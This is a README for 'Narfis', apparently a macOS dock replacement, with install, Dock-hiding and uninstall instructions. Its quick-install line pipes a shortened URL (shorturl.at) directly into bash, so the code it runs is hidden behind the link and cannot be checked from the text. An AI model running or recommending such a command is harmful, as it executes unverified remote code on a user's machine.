<small>Narfis-Swim-Pre1 is in the releases section</small>
# Narfis

![Release](https://img.shields.io/github/v/release/Android-Studio-Developer/Narfis?include_prereleases&label=release)
![Downloads](https://img.shields.io/github/downloads/Android-Studio-Developer/Narfis/total)
![Platform](https://img.shields.io/badge/platform-macOS-lightgrey)
![License](https://img.shields.io/badge/license-MIT-orange)

A dock that actually works — the fluidity of macOS and the utility of Windows in one dock.

## Install

**macOS 13 (Ventura) or later:**

```sh
curl -fsSL https://shorturl.at/XSlIt | bash
```

This downloads the latest `.dmg`, mounts it, copies `narfis.app` into `/Applications`, and launches it.

### Manual install

1. Download the `.dmg` from [Releases](https://github.com/Android-Studio-Developer/Narfis/releases).
2. Open it and drag **narfis** into `/Applications`.
3. Launch narfis from Launchpad or Spotlight.


## Hide the built-in macOS Dock

Since narfis replaces the Dock, you'll probably want the native one out of the way.

**Auto-hide (keeps it, but tucked away):**

```sh
defaults write com.apple.dock autohide -bool true
defaults write com.apple.dock autohide-delay -float 1000
killall Dock
```

`autohide-delay` adds a long delay before the native Dock appears on hover, so it effectively stays out of sight. Reduce or remove it to bring back normal auto-hide behavior.

**Fully hide (no hover reveal):**

```sh
defaults write com.apple.dock autohide -bool true
defaults write com.apple.dock autohide-time-modifier -int 0
defaults write com.apple.dock no-bouncing -bool true
killall Dock
```

Move the Dock off-screen instead by shrinking its display area — combine with `autohide-delay` above for the most reliable "invisible" result, since macOS doesn't offer a true hide toggle for the Dock itself.

**Restore the native Dock:**

```sh
defaults delete com.apple.dock autohide
defaults delete com.apple.dock autohide-delay
defaults delete com.apple.dock autohide-time-modifier
defaults delete com.apple.dock no-bouncing
killall Dock
```

## Uninstall

Quit narfis, then drag `/Applications/Narfis.app` to the Trash. 
or Just 
```sh
 rm -rf /Applications/Narfis.app 
 ```
